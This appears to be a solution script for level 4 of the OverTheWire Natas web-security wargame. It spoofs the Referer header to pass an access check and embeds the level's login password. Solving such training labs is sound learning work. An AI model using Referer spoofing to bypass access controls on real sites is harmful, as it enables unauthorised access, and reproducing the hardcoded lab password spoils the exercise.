import requests
from config import BASE_URL
from utils import save_file

"""
1. change the Referer header to make it seem as if the request is coming from the natas5 url
"""

username = "natas4"
url = BASE_URL.format(username)
password = "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm"
headers = {
    "Referer": "http://natas5.natas.labs.overthewire.org/"
}

r = requests.get(url, headers=headers, auth=(username, password))

save_file("output.txt", r.text)